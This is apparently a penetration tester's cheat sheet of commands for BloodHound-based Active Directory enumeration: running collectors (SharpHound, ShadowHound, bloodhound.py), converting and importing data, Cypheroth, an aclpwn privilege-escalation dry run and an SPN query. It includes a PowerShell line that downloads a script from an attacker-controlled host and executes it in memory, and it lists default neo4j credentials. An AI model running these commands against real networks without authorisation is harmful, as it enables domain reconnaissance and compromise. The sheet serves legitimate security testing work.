# BloodHound

% bloodhound, shadowhound, sharphound, Active Directory

## Start neo4j server
#assessment/AD #attack_type/Enumeration #access/Domain_user

Start the neo4j server to host BloodHound.

```bash
neo4j start
```

## Launch BloodHound-CE
#assessment/AD #attack_type/Enumeration #access/Domain_user

Start BloodHound-CE (Community Edition).

```bash
bloodhound-ce &> /dev/null &
```

## Collect data (BloodHound.py)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Collect data and map the domain using BloodHound.py.

⚠️ Data is formatted for BloodHound legacy.

```bash
bloodhound.py --zip -c All -d <domain> -u <user> -p <password> -dc <dc-ip>
```

## Collect data (BloodHound-CE.py)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Collect data and map the domain using BloodHound-CE.py.

 ⚠️Data is formatted for BloodHound-CE.

```bash
bloodhound-ce.py --zip -c All -d <domain> -u <user>> -p <password> -dc <dc-ip>
```

## Collect data (ShadowHound-DS)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Collect data and map the domain using ShadowHound-DS PowerShell script.

ShadowHound-DS performs direct LDAP queries via DirectorySearcher, which is useful when the AD module is not available or LDAP access is preferred.

⚠️ Data must be converted with using BofHound.py.

```powershell
Import-Module .\ShadowHound-DS.ps1
ShadowHound-DS -OutputFile "ldap_output.txt"
```

## Collect data (ShadowHound-ADM)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Collect data and map the domain using ShadowHound-ADM PowerShell script.

ShadowHound-ADM.ps1 uses the Active Directory module via AD Web Services (ADWS) to collect information on users, groups, computers and certificates.

⚠️ Data must be converted with using BofHound.py.

```powershell
Import-Module .\ShadowHound-ADM.ps1
ShadowHound-ADM -OutputFilePath "ldap_output.txt"
```

## Collect data (SharpHound)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Collect data and map the domain using SharpHound.

⚠️ Data is formatted for BloodHound legacy.

```powershell
runas /netonly /user:<domain>\<domain user> powershell.exe
.\SharpHound.exe 
```

## Collect data (SharpHound PowerShell)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Collect data and map the domain using SharpHound PowerShell script.

⚠️ Data is formatted for BloodHound legacy.

```powershell
Import-Module sharphound.ps1
invoke-bloodhound -collectionmethod all -domain <domain>
```

## Collect data (SharpHound PowerShell - download and execute)
#assessment/AD #attack_type/Enumeration #access/Domain_user

Downloads and execute SharpHound PowerShell script to collect data and map the domain.

⚠️ Data is formatted for BloodHound legacy.

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>
```

## Convert data (BofHound.py)
#assessment/AD #attack_type/Enumeration #access/Anonymous

Convert collected data for BloodHound using BofHound.py.

```bash
bofhound.py -i ldap_output.txt -p All --parser ldapsearch
```

## Import data (BloodHound)
#assessment/AD #attack_type/Enumeration #access/Anonymous

Import collected data into BloodHound legacy.

```bash
bloodhound-import -du <neo4j_username> -dp <neo4j_password> <json_file>
```

## Cypheroth - Start
#assessment/AD #attack_type/Enumeration #access/Anonymous

Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.

https://github.com/seajaysec/cypheroth

```bash
cypheroth -u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>
```

## Aclpwn - from computer to domain - dry run
#assessment/AD #attack_type/Enumeration #access/Anonymous

Aclpwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths.

https://github.com/fox-it/aclpwn.py

```
aclpwn -f <computer_name> -ft computer -d <domain> -dry
```

# QueriesHound
% bloodhound, shadowhound, sharphound, Active Directory, query, queries

## User accounts with SPN
#assessment/AD #attack_type/Quickwin #access/Anonymous

List all user accounts with a ServicePrincipalName (SPN).

```bash
MATCH (n:User)WHERE n.hasspn=true RETURN n
```

= ip: 192.168.1.0/24
= dc-ip: $DC_IP
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= neo4j_username: neo4j
= neo4j_password: neo4j
= json_file: *json

